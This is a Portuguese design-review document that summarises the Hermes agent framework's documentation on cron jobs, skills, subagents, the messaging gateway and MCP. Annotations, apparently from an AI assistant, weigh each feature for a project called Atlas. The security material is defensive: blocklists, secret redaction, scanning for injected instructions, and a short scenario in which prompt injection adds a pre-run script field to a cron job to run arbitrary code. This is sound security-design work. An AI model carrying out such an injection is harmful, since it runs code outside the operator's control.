| `auxiliary` models por tarefa (universal pattern) | B14 (Transport ABC) | 1d |
| `compression.protect_last_n: 20` (literal) | melhoria `AiCompactionService` | 0.5d |
| Lineage via `parent_thread_id` migration + lógica | B5 | 2d |
| `code_execution.mode: project|strict` | B4 (PermissionSession) | 0.5d |
| ID format `YYYYMMDD_HHMMSS_<hex>` para display | B3+B7 | 0.5d |
| `session_search` Postgres tsvector + pg_trgm | B5 ou B5.bis | 1d |
| **YOLO mode + hardline blocklist** | B4 | 1d |
| **DM Pairing protocol** (8 chars, alfabeto não-ambíguo, TTL, rate limit, lockout, `chmod 0600`) | B10 (Telegram gateway) | 2d |
| Docker isolation flags (cap-drop ALL, no-new-privileges, pids-limit, tmpfs) | B11 (Docker backend) | 1d |
| 6 níveis de autorização gateway com default deny | B10 | 1d |
| **MCP env filter** (allowlist `PATH/HOME/USER/LANG/LC_ALL/TERM/SHELL/TMPDIR/XDG_*`) | **urgente — antes de B10** | 1h |
| Redaction patterns (regex `ghp_...`, `sk-...`, etc.) em logs/output | B3 (tool events) | 0.5d |
| Context file scanning (Unicode invisível, HTML comment injection) | B5.bis | 1d |
| Pré-exec scanner minimal nativo (homograph + pipe-to-interp + control chars) | B4 | 0.5d |

**Total adicional desta iteração:** ~15 dias, espalhados em B0/B1/B3/B4/B5/B5.bis/B7/B10/B11/B12/B14.

---

### 24.7 — Configuring Models (`/docs/user-guide/configuring-models`)

**Comandos:**

```bash
hermes model list                                   # provedores autenticados + modelos
hermes model set anthropic/claude-opus-4.7 --provider openrouter
```

Inline (durante chat):
```
/model gpt-5.4 --provider openrouter             # sessão atual
/model gpt-5.4 --provider openrouter --global    # persiste em config.yaml
```

`--global` = mesma ação do botão "Change" do dashboard.

**Auth — 3 caminhos:** API key (env var ou UI "Keys"), OAuth, custom endpoint URL. Provider só aparece em `model list` se autenticado. `hermes setup` adiciona credenciais.

**8 slots auxiliares** (nomes oficiais):

| Slot | Função | Modelo recomendado |
|---|---|---|
| `title_gen` | nome de sessão | gemini-3-flash-preview |
| `vision` | imagens (quando main não tem visão) | gemini-2.5-flash |
| `compression` | resumo de contexto | gemini-3-flash |
| `session_search` | recall queries | flash/haiku barato |
| `approval` | `mode: smart` decide auto-aprovação | haiku/flash/gpt-4o-mini |
| `web_extract` | sumarização de páginas | similar à compression |
| `skills_hub` | busca em `hermes skills search` | auto |
| `mcp` | roteamento MCP | auto |

Cada slot default `auto` = usa main model. Override quando `provider != auto` e `model` é válido. Se override aponta para provider não-autenticado, cai pra OpenRouter default + warn em `agent.log`.

**Cost tracking** — página Models com cards ranqueados por sessão (token counts + custo + capability badges). Cálculo agregado por provedor/modelo.

> **claude:** **8 slots auxiliares com nomes canônicos é abstração que Atlas precisa adotar.** Hoje Atlas tem `claude_cli` ou `codex_cli` para tudo — uma interação faz 1 chamada. Quando entrar Transport ABC (B14), criar `config/atlas-auxiliary.php` com os 5 slots mais relevantes para Atlas: `title_gen` (nome da thread auto), `compression` (já existe `AiCompactionService`, pode usar Haiku), `session_search` (B5: tsvector + sumarização), `approval` (smart mode em B4), `quality_evaluator` (`AiQualityEvaluator`). Roteamento `auto` = main model = compatibilidade com setup atual.

> **claude:** **fallback com warn em log em vez de erro** é decisão certa. Atlas hoje em provider offline cai pra erro 500. Mudar `AtlasCliProviderStrategyService::recommend()` para warn + fallback é trabalho de meio dia em B6.

> **claude:** "página Models com cards ranqueados" — Atlas tem `ai_traces.metadata.cost` mas não tem dashboard agregado. `atlas:cli:dashboard` poderia ganhar seção "Top models 7d" com cards. ~1 dia em B7.

---

### 24.8 — Profiles (`/docs/user-guide/profiles`)

**Por quê.** Múltiplos agentes Hermes independentes na mesma máquina — isolamento completo do estado. Casos: assistente de código + bot pessoal + agente de pesquisa coexistindo.

**Comandos:**

```bash
hermes profile create mybot                          # em branco
hermes profile create work --clone                   # copia config.yaml + .env + SOUL.md
hermes profile create backup --clone-all             # snapshot completo (com sessions)
hermes profile create work --clone --clone-from coder  # clone de outro profile

hermes -p coder chat                                  # uso explícito
hermes --profile=coder doctor
hermes profile use coder                              # define default persistente
```

**Auto-alias.** Profile vira **comando executável** em `~/.local/bin/<name>`: `coder chat`, `coder setup`.

**Banner/prompt** mostram profile ativo: `coder ❯`, "Profile: coder".

**Isolamento** — cada profile tem `~/.hermes/profiles/<name>/` com:
- `config.yaml` (modelo, toolsets)
- `.env` (API keys + bot tokens distintos)
- `SOUL.md` (personalidade)
- sessions, memory, skills, state DB, logs, cron jobs

**Implementação.** Wrapper script seta `HERMES_HOME=~/.hermes/profiles/coder`. **119+ arquivos** resolvem path via `get_hermes_home()`.

**Importante:** profile **≠ workspace**. `terminal.cwd: "."` é "diretório de lançamento", não profile home.

**`hermes update`** sincroniza código + skills entre profiles automaticamente.

**Limitações:**
- **NÃO é sandbox** — agente em qualquer profile tem mesmo acesso ao filesystem da conta
- Profile default (`~/.hermes`) não deletável (usar `hermes uninstall`)
- SOUL.md guia mas não força limite de workspace

> **claude:** **profiles é feature mais para agente generalista (multi-uso) que para Atlas (operador único).** Vitor não precisa "Atlas-coder + Atlas-personal" — Atlas é cirúrgico, persona única. **Não copiar.**

> **claude:** o detalhe arquitetural útil é o padrão `get_hermes_home()` resolvido em 119+ arquivos. Atlas com `storage_path('ai/...')` Laravel já tem similar (1 ponto, 1 implementação). Se algum dia Atlas precisar multi-tenancy real (improvável), o padrão Hermes é a referência.

> **claude:** **auto-alias em `~/.local/bin/<name>`** é UX clever — `coder chat` "vira comando". Atlas pode adotar para cenários específicos: `atlas-debug` (alias de `atlas:ai:chat --mode=debug`), `atlas-fix` (alias de `atlas:cli:fix`). Mas é cosmético e o B0 já cobriu (ele já tem `atlas dev/plan/review` no shell wrapper). **Skip.**

---

### 24.9 — Git Worktrees (`/docs/user-guide/git-worktrees`)

**`-w` flag** cria worktree descartável dentro de `.worktrees/` no repositório.
- Branch naming auto: `hermes/hermes-<hash>`
- Combina com `-q`: `hermes -w -q "Fix issue #123"`
- Cada `hermes -w` em terminal separado = worktree próprio (parallelismo real)

**Operação.** Agent trata cwd como raiz do projeto. Acessa arquivos do checkout específico (sem cópias/symlinks). Checkpoint Manager scoped por worktree.

**Cleanup.** **NÃO é automático.** Usuário decide manter (merge) ou descartar (`git worktree remove ../repo-feature`). Comando recusa remover com changes uncommitted (a menos que `--force`). Branch não some sozinha — `git branch -D` manual.

**Casos de uso:**
- Refactorings em batch (múltiplos agents paralelos)
- Abordagens alternativas pra mesma tarefa
- Sandbox de write isolado do trunk
- Pairing CLI + gateway no mesmo repo

**Limitações:**
- Sem limite de worktrees simultâneos documentado
- Localização hardcoded em `.worktrees/`
- Garbage collection manual

> **claude:** **`-w` é a feature de operação mais valiosa do Hermes para o tipo de trabalho que Vitor faz.** Atlas com B2 (DevExecutionPlan) deve adotar `atlas dev -w "X"` como **caminho default para tarefas com `--max-iterations > 1`**. Argumento: se o repair loop pode tocar arquivos múltiplas vezes, melhor faz isso em worktree descartável. Trabalho em B2: ~1 dia (chamada `git worktree add` + cwd switch + cleanup prompt no fim).

> **claude:** **NÃO copiar a localização hardcoded `.worktrees/`** — Atlas pode usar diretório fora do repo (`~/.atlas/worktrees/<repo-hash>/<branch>/`) para evitar poluir `.gitignore` do projeto. Mais higiênico.

> **claude:** combinação **worktree + checkpoint per worktree** (Hermes faz isso) é arquitetura sólida. Atlas com checkpoints em `storage/app/ai/checkpoints/{ts-slug}/` precisa adicionar `workspace` field (já tem) para isolar por worktree. Já está cobertO no schema atual.

---

### 24.10 — Cron / Scheduled Jobs (`/docs/user-guide/features/cron`)

**3 caminhos de criação:**

```
# Via chat (slash):
/cron add 30m "Remind me to check the build"
/cron add "every 2h" "Check server status"
/cron add "every 1h" "Summarize feeds" --skill blogwatcher

# Via CLI standalone:
hermes cron create "every 2h" "Check server status"
hermes cron create "every 1h" "Use both skills" --skill blogwatcher --skill maps --name "Skill combo"

# Via conversação natural — agente usa tool `cronjob` internamente
"Every morning at 9am, check Hacker News and send me a summary on Telegram"
```

**4 formatos de schedule:**

| Tipo | Exemplo | Comportamento |
|---|---|---|
| Delay relativo | `30m`, `2h`, `1d` | one-shot |
| Intervalo recorrente | `every 30m`, `every 2h` | repeat indef |
| Cron expression | `0 9 * * *` (9h diário), `0 9 * * 1-5` (úteis), `0 */6 * * *` | cron padrão |
| ISO timestamp | `2026-03-15T09:00:00` | one-shot absoluto |

**Job schema completo (17 campos, persistido em `~/.hermes/cron/jobs.json`):**

```python
{
  "job_id": "uuid",
  "name": "descriptive-name",
  "schedule": "0 9 * * *",
  "prompt": "task description",
  "skills": ["skill1", "skill2"],
  "repeat": 5,                       # 1=one-shot ou forever
  "next_run_at": "2026-03-15T09:00:00Z",
  "last_run_at": "2026-03-14T09:00:00Z",
  "enabled": true,                   # pause/resume toggle
  "workdir": "/absolute/path",       # opcional, p/ projetos
  "delivery_target": "origin",       # origin|local|telegram|discord|slack|whatsapp|signal|matrix|email|sms
  "enabled_toolsets": ["web", "file"],
  "context_from": ["job-id-1"],      # CHAINING — output de outro job vira contexto deste
  "script": "python code",           # pre-run script
  "model": null,                     # override por-job
  "provider": null,
  "wrap_response": true,             # header/footer
  "created_at": "2026-03-01T...",
  "updated_at": "2026-03-01T..."
}
```

**Atomic file writes** previnem corrupção em interrupção.

**Tick mechanism.** Gateway daemon roda scheduler a cada **60s**. Lock `~/.hermes/cron/.tick.lock` previne sobreposição. Output em `~/.hermes/cron/output/{job_id}/{timestamp}.md`.

Fluxo: load jobs → comparar `next_run_at` com agora → para cada vencido: fresh `AIAgent` session → inject skills → execute prompt → deliver → update `next_run_at`.

**Gateway install:**

```bash
hermes gateway install                # service do user
sudo hermes gateway install --system  # boot-time Linux
hermes gateway                         # foreground
hermes cron status
hermes cron tick                      # força execução manual
```

**Delivery targets** (10 opções):

| Target | Onde |
|---|---|
| `origin` | volta pra plataforma de origem (default em messaging) |
| `local` | só salva em `~/.hermes/cron/output/` (default CLI) |
| `telegram` | canal home via `TELEGRAM_HOME_CHANNEL` |
| `telegram:123456` | chat específico por ID |
| `discord:#engineering` | canal Discord por nome |
| `slack`, `whatsapp`, `signal`, `matrix`, `email`, `sms` | requer credentials |

**Wrapping default.** Resposta vai com header/footer. Desabilitar:

```yaml
cron:
  wrap_response: false
```

**`[SILENT]` marker.** Se resposta começa com `[SILENT]`, **delivery é suprimida** (output ainda salvo local). Útil para monitoramento que só reporta anomalias. **Failed jobs sempre entregam, ignoram `[SILENT]`.**

**Multi-skill** carregadas em ordem:

```python
cronjob(action="create",
        skills=["blogwatcher", "maps"],
        prompt="Look for new local events...",
        schedule="every 6h",
        name="Local brief")
```

**Comandos de gerenciamento:**

```
/cron list / pause / resume / run / remove / edit
hermes cron list / pause / resume / run / remove / status
```

API programática unificada (tool `cronjob`):

```python
cronjob(action="create", ...)
cronjob(action="list" | "update" | "pause" | "resume" | "run" | "remove", ...)
```

**Edge cases:**
- jobs com `workdir` rodam **sequencialmente** (TERMINAL_CWD é global)
- jobs sem workdir rodam em pool paralelo
- **cron-run sessions não podem recursivamente criar mais cron jobs** (anti-runaway)
- prompts validados contra prompt injection / credential exfiltration na criação e update
- recovery automático em rate-limit via `fallback_providers` ou credential pool rotation

> **claude:** **`context_from` (chaining de outputs entre jobs) é feature original e poderosa.** Hermes encadeia: job A produz markdown → job B pega esse markdown como contexto → job B refina/sumariza. Atlas em B9 deve adotar — workflow comum: "scrape → filter → notify". Schema: `context_from: ["job_id_1"]` array, scheduler injeta últimos N outputs no prompt do job dependente. Trabalho extra: ~0.5d em B9.

> **claude:** **`[SILENT]` marker** é UX brilhante para monitoring jobs. Atlas adopt: se prompt começa com instrução tipo "*só reporte se houver anomalia*", agente pode emitir `[SILENT]` quando tudo OK. Salva spam de Telegram. Atlas em B9: regex no output do agent — `if str_starts_with(trim($output), '[SILENT]') deliver = false`. Trabalho: 5 minutos.

> **claude:** **"failed jobs always deliver" override** é regra de segurança que evita silenciar erros. **Adoção literal em B9.**

> **claude:** **anti-recursion (cron pode disparar cron?)** — Atlas em B9 deve ter mesma proteção. Quando worker está executando job de cron, desabilitar a tool `atlas:cli:schedule create` no prompt context. Sem isso, agente pode criar 1000 jobs em loop por bug.

> **claude:** **`script` field (pre-run Python code)** é interessante mas **rejeito para Atlas**. É vetor de execução arbitrária persistida; um prompt injection que adiciona `script` pode rodar código fora do controle. Atlas em B9 deve **ignorar `script` field**. Pre-run logic vai em skill bundle, não em campo de cron job.

> **claude:** **delivery target `local` (default CLI)** confirma decisão prática: maioria dos cron jobs do Vitor não precisa Telegram inicialmente — só salvar em arquivo já é útil. **B9 default = `local`**, Telegram entra com B10.

> **claude:** **`workdir` jobs sequenciais é regra esperta** — evita 2 cron jobs editando o mesmo arquivo simultaneamente. Atlas com Laravel queue: usar `WithoutOverlapping` middleware com chave = `"atlas:cron:{workdir}"`.

> **claude:** **tick = 60s via Laravel Scheduler** — Atlas já tem isso pronto. Adicionar `php artisan schedule:run` rodando every minute via `crontab -e` ou supervisor. Custo: 0 — já vem com Laravel.

---

### 24.11 — Skills Hermes (`/docs/user-guide/features/skills`)

**Diretórios:**

| Path | Função |
|---|---|
| `~/.hermes/skills/` | **canônico** — bundled, hub-installed, agent-created |
| `external_dirs` em config | read-only para discovery (expande `~`, `${VAR}`) |

Precedência: local override external (sombreamento por nome).

**Frontmatter Hermes-específico** (extensão sobre agentskills.io):

```yaml
metadata:
  hermes:
    tags: [...]
    category: "devops"
    fallback_for_toolsets: ["web"]   # skill aparece SÓ se toolset ausente
    requires_toolsets: ["file"]      # skill aparece SÓ se toolset presente
    fallback_for_tools: [...]
    requires_tools: [...]
    config:                          # settings não-secretos
      - key: "default_browser"
        description: "..."
        default: "chromium"
        prompt: "Which browser?"
platforms: [macos, linux]            # restrição de OS
required_environment_variables:      # secrets, prompts, help URIs
  - name: GITHUB_TOKEN
    prompt: "GitHub PAT"
    help_url: "https://github.com/settings/tokens"
required_credential_files:
  - path: "~/.gh/auth.json"
    mount: "/root/.gh/auth.json"
    mode: "ro"
```

**Skills incompatíveis (platform mismatch) são auto-hidden** do system prompt, `skills_list()`, e slash commands.

**Tool `skill_manage` (autônomo):**

| Action | Função | Quando |
|---|---|---|
| `create` | novo skill | após 5+ tool calls bem-sucedidas; workflow não-trivial; erro corrigido |
| `patch` | **preferida** — diff direcionado, eficiente em tokens | atualização incremental |
| `edit` | rewrite estrutural | refactor |
| `delete` | remoção | obsoleta |
| `write_file` / `remove_file` | mexer em arquivos do bundle | scripts/, references/ |

**Sem auto-improvement loop no core** — `hermes skills reset` reseta skills bundled abandonando edits locais. Refinamento iterativo verdadeiro fica no repo separado [`hermes-agent-self-evolution`](https://github.com/NousResearch/hermes-agent-self-evolution) (DSPy + GEPA).

**Discovery via progressive disclosure:**
- Nível 0: lista `(nome, descrição, categoria)` em ~3k tokens
- Nível 1: full skill content sob demanda
- Nível 2: referências específicas (`skill_view(name, path)`)

**Comandos de gerenciamento:**

```bash
hermes skills browse                    # navega todos
hermes skills search <q> --source <fonte>
hermes skills inspect <id>              # preview pre-install
hermes skills install <id> [--force]
hermes skills check                     # detecta updates upstream
hermes skills update                    # reinstala com deltas
hermes skills reset                     # resetar bundled
```

**Sources de hub** (8):

| Source | O que é |
|---|---|
| `official` | skills opcionais no repo Hermes |
| `skills-sh` | diretório público Vercel |
| `well-known` | via `/.well-known/skills/index.json` (descoberta portátil) |
| `github` | repos diretos (taps padrão: `openai/skills`, `anthropics/skills`) |
| `clawhub`, `lobehub`, `claude-marketplace` | integrações comunitárias |
| `url` | `SKILL.md` único em HTTP(S) |

**Trust levels:**

| Nível | Inclui |
|---|---|
| `builtin` | shipped no repo |
| `official` | autorizado pela Nous Research |
| `trusted` | OpenAI, Anthropic |
| `community` | tudo o resto |

**Scanning** em `install`: exfiltração, prompt injection, comandos destrutivos. `--force` override só para `non-dangerous` findings; `dangerous` **sempre bloqueado**.

**Bundled manifest:** `~/.hermes/skills/.bundled_manifest` rastreia skills shipped. Versões `user-modified` são puladas em sync (proteção contra sobrescrita acidental).

**Slash command de skill** integra automaticamente: `/<skill-name> [args]`.

> **claude:** **`fallback_for_toolsets` é o conceito mais útil dessa página.** Atlas hoje tem 12 runtime tools fixos (`AtlasRuntimeCommand`). Quando algum toolset não está habilitado (ex: `web` ausente porque sem API key), uma skill `local-research-only` poderia tomar o lugar. Padrão **excelente** para B5.bis: criar `metadata.atlas.fallback_for_tools: [search.rg]` que vira útil quando ferramenta principal não existe.

> **claude:** **`requires_toolsets` / `requires_tools` (ativação condicional)** é cleaner que registry com filtro manual. Atlas em B5.bis adotar literalmente. Trabalho: ~30 linhas no `AiSkillBundleStore::filterAvailable()`.

> **claude:** **`platforms: [macos, linux]` auto-hide** — Atlas é macOS-only inicialmente, mas o **mecanismo de auto-hide é importante**. Quando Atlas suportar Linux server (B11 remote), skills precisarão declarar suporte. Mais barato adotar agora.

> **claude:** **trust levels** — Atlas adotar `metadata.atlas.trust_level: builtin|official|community`. Default `community` (warn em install). `builtin` skills (que vem com Atlas) tem trust automático. Trabalho: ~10 linhas em `AiSkillBundleScanner`.

> **claude:** **`well-known/skills/index.json`** é padrão portátil para distribuição — qualquer URL com esse arquivo vira hub. Atlas pode publicar `https://atlas.vitor.dev/.well-known/skills/index.json` quando tiver skills curadas. Custo: 0, ganho: portabilidade.

> **claude:** **`skill_manage` patch action preferida por eficiência de tokens** — Atlas em B5.bis adotar mesma prioridade. Diff/patch é mais barato que rewrite e mais auditável. Trabalho: implementar como tool runtime.

> **claude:** **`required_environment_variables` com `prompt` + `help_url`** é UX premium. Em vez de skill falhar silenciosamente porque `GITHUB_TOKEN` não está setado, Atlas pode prompt o operador no `atlas:cli:doctor` ou no momento de ativação. Adoção em B5.bis: ~1 dia (parser + integração com `AtlasCliDoctorService`).

> **claude:** **scanning bloqueia `dangerous` mesmo com `--force`** — defesa não-negociável. Atlas em B5.bis adotar a mesma regra. `--force` permite só warning-level overrides.

> **claude:** **bundled manifest com proteção user-modified** é higiene para evitar atrito em `hermes update`. Atlas com `composer update` que pode sobrescrever `atlas-server/skills/`: usar git diff `.bundled_manifest` antes de sync.

> **claude:** sem auto-improvement loop no core **confirma o que Atlas planejou em B5**: `MemoryDelta` é proposto pelo agente, ratificado pelo operador, NÃO automático. Mesmo design.

---

### 24.12 — Subagent Delegation (`/docs/user-guide/features/delegation`)

**Função `delegate_task`:**

```python
# Tarefa única
delegate_task(goal="...", context="...", toolsets=[...], max_iterations=50)

# Batch paralelo (até 3 simultâneos por padrão)
delegate_task(tasks=[
    {"goal": "...", "context": "...", "toolsets": [...]},
    ...
])
```

Retorna sumário estruturado: ações, descobertas, arquivos modificados, problemas.

**Isolamento total.** Subagent inicia com **conversa completamente nova**. Zero histórico parental, zero tool calls anteriores. Único contexto: `goal` + `context` que parental popula. Cada subagent recebe terminal session própria. Apenas summary final volta ao parental — economia de tokens.

Exemplo ruim: `delegate_task(goal="Fix the bug")` → subagent cego.
Exemplo bom: `delegate_task(goal="Fix the bug", context="File: app/auth.py:42, error: TypeError, stack: ..., Python 3.11, repo /home/user/proj")` → subagent autônomo.

**2 roles:**

| Role | Comportamento |
|---|---|
| `leaf` (default) | filho não delega; flat |
| `orchestrator` | filho **mantém** tool `delegate_task` para spawn próprios workers |

**Max spawn depth** (`delegation.max_spawn_depth` em config.yaml):

| Valor | Árvore | Cap teórico (com `max_concurrent_children=3`) |
|---|---|---|
| 1 (default) | flat: pai → leaves | 3 leaves |
| 2 | pai → orch → leaves | 9 leaves |
| 3 (máximo) | pai → orch → orch → leaves | **27 leaves concorrentes (3³)** |

Cada nível multiplica despesa. Aumentar intencionalmente.

**Tools bloqueadas em subagents** (todos):
- `delegate_task` (leaves)
- `clarify`
- `memory`
- `code_execution`
- `send_message`

Orchestrators mantém `delegate_task` mas perdem os outros 4.

**Limitações críticas:**
- **Síncrono, não-durável.** Parental bloqueado até todos filhos retornarem. Se parental é interrompido, **filhos ativos são cancelados, trabalho descartado**.
- Timeout default 600s (10 min) sem atividade → diagnóstico em `~/.hermes/logs/subagent-timeout-*.log`.
- **Não há file-coordination explícita** entre irmãos. Designer estrutura tasks para evitar escrita simultânea no mesmo arquivo.

**Casos de uso:**
- Pesquisa paralela (3 subagents pesquisam WebAssembly + RISC-V + computação quântica simultâneo)
- Code review + fix (1 subagent audita módulo, executa testes)
- Refactor multi-arquivo (substituir `print()` por logging em base grande sem inflar pai)

**`/agents` overlay (TUI):** árvore live, rollups por branch (custo/tokens/files), controles `kill`/`pause` per-subagent. CLI clássico só sumário texto.

> **claude:** **27 leaves concorrentes (3³)** é risco real de explosão de custo. Atlas em B12 (background) e qualquer extensão futura de subagents deve **default cap em 1 nível** (flat). Mais profundidade só com flag explícita + warning de custo. Operador pode aprovar; default não dispara.

> **claude:** **subagent começa com sessão nova** é a decisão arquitetural certa. Atlas em B12 adotar. `delegate_task(goal, context, toolsets)` cria `AiSubagentJob` com `parent_trace_id` mas sem messages history. Resultado volta como tool result no loop do parent.

> **claude:** **tools bloqueadas em subagent (`memory`/`code_execution`/`send_message`)** — Atlas adotar mesma lista. Subagent não escreve memory (operador ratifica em parent), não executa código sem approval (parent gerencia), não responde plataforma (parent é dono da conversa).

> **claude:** **Hermes subagents são síncronos e não-duráveis — Atlas com Laravel queue tem oportunidade de fazer melhor.** `AiSubagentJob` na queue + parent registra `awaiting_children: [job_ids]` em `ai_traces.metadata` + recebe callback ao terminar. Vantagens:
> - subagent sobrevive se parent for interrompido (Vitor pode `Ctrl+C` parent e ainda receber resultado de pesquisa de 5min depois)
> - paralelismo real (Laravel queue workers escalam horizontalmente)
> - rastreabilidade (cada subagent é trace separado, auditável via `atlas trace show`)
> 
> Tradeoff: complexidade. Mas é a vantagem natural de stack Postgres+Queue. **Recomendo durável-por-default em B12.**

> **claude:** **sem file-coordination** é problema sério. Atlas em B12 deve **forçar cada subagent em worktree separado** quando há múltiplos paralelos. Reusa B2 (worktrees per dev session). Sem isso, 2 subagents editando `app/auth.php` = corrupção.

> **claude:** **`/agents` overlay com kill/pause** já estava no meu plano de §24.3 (TUI). Confirma. Trabalho em B12 + B7: ~2 dias.

---

### 24.13 — Messaging Gateway overview (`/docs/user-guide/messaging`)

**Conceito.** Gateway = **single background process** conectando a todas plataformas configuradas, gerenciando sessions, executando cron jobs e entregando voice. Camada central que integra Telegram/Discord/Slack/WhatsApp/Signal/SMS/Email/Mattermost/Matrix/DingTalk/Feishu/WeCom/Weixin/BlueBubbles/QQ/Yuanbao em **um único ponto de controle**.

**Lifecycle:**

```bash
hermes gateway setup                      # config interativa
hermes gateway install                    # service de usuário (Linux/macOS)
sudo hermes gateway install --system      # boot-time Linux
hermes gateway start / stop / status
```

Linux logs: `journalctl --user -u hermes-gateway -f`.
macOS plist: `~/Library/LaunchAgents/ai.hermes.gateway.plist`.
macOS logs: `~/.hermes/logs/gateway.log`.

**Autorização:** default **nega todos** não-allowlisted nem pareados via DM. Configure via env vars (`TELEGRAM_ALLOWED_USERS`, `DISCORD_ALLOWED_USERS`, etc.) ou pareamento DM. `GATEWAY_ALLOW_ALL_USERS=true` desencorajado para bots com terminal access.

**Slash commands messaging-only** (vs CLI):

| Comando | Função |
|---|---|
| `/new` / `/reset` | nova conversa |
| `/sethome` | define canal como **home** (recebe outputs de cron) |
| `/insights [dias]` | análise agregada |
| `/voice [on/off/tts/join/leave/status]` | controle voice mode |
| `/rollback [n]` | restaurar checkpoints |
| `/approve` / `/deny` | comandos perigosos pendentes |
| `/reload-mcp` | reload servidores MCP |
| `/update` | hot update |

**Per-platform feature matrix:**

| Plataforma | Suporte completo | Faltam |
|---|---|---|
| Telegram, Discord, Slack, Feishu, Matrix | voz, imagens, arquivos, threads, reactions, typing, streaming | — |
| WhatsApp, Signal | maioria | sem voz, sem threads |
| SMS | mínimo | quase tudo |
| DingTalk, Weixin | maioria | sem voz |
| WeCom Callback, Email | limitado | streaming, threads |
| Home Assistant | só device control | tools genéricas |

**Streaming.** Atualizações progressivas via **edição de mensagem** em plataformas suportadas. `display.tool_progress: off|new|all|verbose` controla feedback de tool execution.

**Auto-resets.** Default: **4 AM diário** ou **1440 min idle**. Salva memórias antes. Active background processes nunca sofrem auto-reset.

**Webhooks.** Adapter completo (`hermes-webhook`) — suporta toolset full incluindo terminal. Mesmas restrições de segurança.

**Sem cross-platform continuity.** Cada plataforma = sessions separadas. `/resume [name]` pra portabilidade manual entre canais.

> **claude:** **gateway como single process** com adapters por plataforma é o padrão certo. Atlas em B10 adotar literalmente. Laravel queue worker dedicado (`atlas:gateway:run`) com long-polling em cada platform adapter.

> **claude:** **`/sethome` define canal home pra cron output** é UX que Atlas precisa em B9+B10. Vitor define `/sethome` em chat Telegram — daí em diante, todo `atlas:cli:schedule` com `delivery_target: home` vai pra esse chat. Implementação: `ai_gateway_home_channels` table + slash command. Trabalho 0.5d.

> **claude:** **default nega todos** é regra de ouro que Atlas precisa adotar em B10. `GATEWAY_ALLOW_ALL_USERS` nem deve existir como flag — quem realmente precisa adicionar via allowlist.

> **claude:** **per-platform feature matrix declarado é gentil** — operador sabe o que esperar. Atlas começa com Telegram (full features), pode expandir só após. Não copiar matriz de 17 plataformas; **escolher 3** (Telegram + Discord + Email) e parar aí pra V2.

> **claude:** **auto-resets diários (4 AM)** — interessante decisão. "hygiene break diário" evita session crescer indefinidamente. Atlas pode adotar em B10 com flag opt-in `gateway.auto_reset_at: "04:00"`.

> **claude:** **webhook como adapter completo** é insight importante. Em vez de Atlas implementar adapter Telegram do zero (lib `python-telegram-bot` etc.), pode usar **Telegram → ngrok webhook → Atlas API endpoint** como caminho mais barato no day 1. Trabalho B10 reduz de 5-7 dias para ~3 dias.

---

### 24.14 — MCP (`/docs/user-guide/features/mcp`)

**Hermes é cliente E servidor MCP.**

**Como cliente** (consome MCP externos):
- Descoberta automática de capacidades em init
- Re-discovery dinâmico via `notifications/tools/list_changed`
- Namespacing automático: `mcp_<server>_<tool>` (evita colisão)

**Como servidor** (`hermes mcp serve`):
- Interface stdio
- Outros agentes (Claude Code, Cursor) consomem capacidades Hermes
- **10 tools expostas:**
  1. `conversations_list`
  2. `conversation_get`
  3. `messages_read`
  4. `attachments_fetch`
  5. `events_poll`
  6. `events_wait`
  7. `messages_send`
  8. `channels_list`
  9. `permissions_list_open`
  10. `permissions_respond`

Read funciona sem gateway ativo; sends exigem conexões plataforma estabelecidas.

**2 transports:**

| Transport | Quando | Config |
|---|---|---|
| `stdio` | subprocess local via stdin/stdout | `command` + `args` + `env` |
| `http` | endpoint remoto | `url` + `headers` |

Config exemplo:

```yaml
mcp_servers:
  github:
    command: "npx"
    args: ["-y", "@modelcontextprotocol/server-github"]
    env:
      GITHUB_PERSONAL_ACCESS_TOKEN: "***"
  remote_api:
    url: "https://mcp.example.com/mcp"
    headers:
      Authorization: "Bearer ***"
```

Chaves comuns: `timeout`, `connect_timeout`, `enabled`, `tools`.

**Filtragem de tools:**

| Padrão | Significado |
|---|---|
| `tools.include: [...]` | whitelist (só esses) |
| `tools.exclude: [...]` | blacklist (oculta esses) |
| `tools.resources: false` | desativa `list_resources`/`read_resource` |
| `tools.prompts: false` | desativa `list_prompts`/`get_prompt` |

`include` prevalece sobre `exclude` se ambos.

**Filtragem de credentials para MCP stdio:** **não passa env shell completo** — apenas `env` configurado + baseline (`PATH`/`HOME`/`USER`/etc.). Reduz vazamento acidental.

**OAuth.** Não documentado explicitamente; tokens via env (stdio) ou headers (HTTP).

**Built-in MCP servers:** nenhum intrínseco. Compatíveis: GitHub, Stripe, filesystem, APIs internas customizadas — tudo instalável via npm.

**Sampling** (LLM inference via MCP) habilita por default com sliding-window rate-limiter + recursion depth limits.

**Limitações:**
- HTTP MCP ainda limitado (apenas stdio funciona em todas as features)
- Polling de eventos ~200ms
- Sem push protocol (`claude/channel`)
- `messages_send` = text-only

> **claude:** **Atlas como servidor MCP** é caminho de **expansão de ecossistema**. Quando Atlas tem `MemoryDelta`, threads, scheduled tasks, traces — outros agentes podem consultar via MCP. As 10 tools que Hermes expõe são bom catálogo. Não bloqueia V2.0; vale como B15+ se quiser que Atlas seja consumível por Claude Code/Cursor/Zed.

> **claude:** **Atlas como cliente MCP** é mais imediato. Hoje Atlas tem `AtlasRuntimeCommand` com 12 tools fixos. Adicionar suporte a MCP servers externos abre acesso a centenas de tools (GitHub, Stripe, filesystem, Linear, Slack, etc.) sem ter que implementar cada uma. Trabalho: ~3-4 dias para suporte stdio inicial. Encaixa como **B15** ou parte de B14 (Transport ABC).

> **claude:** **`mcp_<server>_<tool>` namespacing** é padrão importante. Atlas adotar literalmente.

> **claude:** **filtragem de credentials MCP** — passa só `env` configurado + baseline `PATH/HOME/USER/LANG/...`. Mesmo princípio do §24.6 sobre MCP env filter. Atlas adotar.

> **claude:** HTTP MCP ainda imaturo no Hermes — Atlas pode entrar com **HTTP MCP nativo desde o início**, ganhando vantagem competitiva pequena nesse front.

> **claude:** **`hermes mcp serve` expor `permissions_list_open` + `permissions_respond` é interessante** — outro agente pode aprovar/negar comandos pendentes do Hermes via MCP. Casa com B4 (PermissionSession) — Atlas pode expor mesmas tools como bloco futuro de "remote approval" (operador aprova de outro device via Claude Code).

---

### 24.15 — Providers (`/docs/integrations/providers`)

**18+ providers** em 4 categorias de auth:

| Auth | Providers |
|---|---|
| **OAuth browser** | Nous Portal, OpenAI Codex, GitHub Copilot, Anthropic, Google Gemini, Qwen Portal, MiniMax, Ollama Cloud |
| **API Key** | OpenRouter, z.ai/GLM, Kimi/Moonshot, Arcee AI, GMI Cloud, MiniMax, Alibaba Cloud, DeepSeek, HuggingFace, NVIDIA NIM |
| **AWS** | Bedrock (boto3 padrão: arquivo, IAM roles, SSO) |
